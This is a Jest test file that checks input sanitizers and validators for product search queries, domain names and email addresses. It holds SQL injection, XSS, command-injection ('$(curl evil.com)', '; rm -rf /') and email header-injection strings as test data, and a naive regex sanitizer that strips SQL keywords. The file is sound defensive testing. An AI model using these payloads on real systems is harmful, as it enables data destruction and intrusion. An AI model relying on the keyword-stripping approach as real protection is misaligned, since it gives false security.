import { describe, it, expect } from '@jest/globals';

export function runRealWorldInjectionTests() {
  describe('Real-World Application Tests', () => {
    it('should sanitize product search queries', () => {
      const maliciousQueries = [
        "pump'; DROP TABLE products; --",
        "'; UNION SELECT * FROM users--",
        "<script>alert('xss')</script>",
      ];

      const sanitize = (query: string) => {
        return query
          .replace(/<[^>]+>/g, '')
          .replace(/['"`;\\]/g, '')
          .replace(/\b(SELECT|INSERT|UPDATE|DELETE|DROP|UNION|EXEC)\b/gi, '')
          .trim();
      };

      maliciousQueries.forEach((query) => {
        const sanitized = sanitize(query);

        expect(sanitized).not.toContain('<script>');
        expect(sanitized).not.toContain('DROP');
        expect(sanitized).not.toContain("'");
        expect(sanitized).not.toContain(';');
      });
    });

    it('should validate domain names in customer configs', () => {
      const domains = [
        { input: 'example.com', expected: true },
        { input: 'sub.example.com', expected: true },
        { input: 'example.com; rm -rf /', expected: false },
        { input: '$(curl evil.com)', expected: false },
      ];

      const isValidDomain = (domain: string) => {
        return /^[a-zA-Z0-9.-]+$/.test(domain) && !/[;&|`$()]/.test(domain);
      };

      domains.forEach(({ input, expected }) => {
        expect(isValidDomain(input)).toBe(expected);
      });
    });

    it('should validate email addresses against injection', () => {
      const emails = [
        { input: 'user@example.com', expected: true },
        { input: "user'; DROP TABLE--@example.com", expected: false },
        { input: 'user\r\nCc: hacker@evil.com', expected: false },
      ];

      const isValidEmail = (email: string) => {
        return /^[^\s@]+@[^\s@]+\.[^\s@]+$/.test(email) && !/['";\r\n\\]/.test(email);
      };

      emails.forEach(({ input, expected }) => {
        expect(isValidEmail(input)).toBe(expected);
      });
    });
  });
}
